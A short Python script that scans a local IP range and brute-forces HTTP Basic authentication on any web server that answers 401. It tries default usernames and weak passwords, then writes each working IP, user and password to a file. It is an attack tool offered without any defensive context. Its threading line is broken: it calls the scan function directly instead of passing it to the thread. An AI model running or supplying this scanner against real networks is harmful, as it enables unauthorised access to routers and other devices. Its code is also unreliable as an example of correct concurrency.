import requests
from requests.auth import HTTPBasicAuth
from ipaddress import IPv4Network
import threading

def search_target(range):
    user = ['root','admin']
    password = ['root','admin','123456','123']
    for ip in IPv4Network(range):
        print(ip)
        try:
            response = requests.get('http://' + str(ip), timeout=5.0)
            if response.status_code == 401:
                for u in user:
                    for p in password:
                        response = requests.get('http://'+str(ip), auth=HTTPBasicAuth(u, p))
                        if response.status_code == 200:
                            f = open('target_accessed.txt','a+')
                            f.write('IP: {} User: {} Password: {}\n'.format(ip,u,p))
                            f.close()
                            break
        except requests.exceptions.ConnectionError:
            continue
        except requests.exceptions.ReadTimeout:
            continue
        except Exception:
            continue
for x in range(5):
    threading.Thread(target=search_target('192.168.0.0/24')).start()
# search_target('192.168.0.0/24')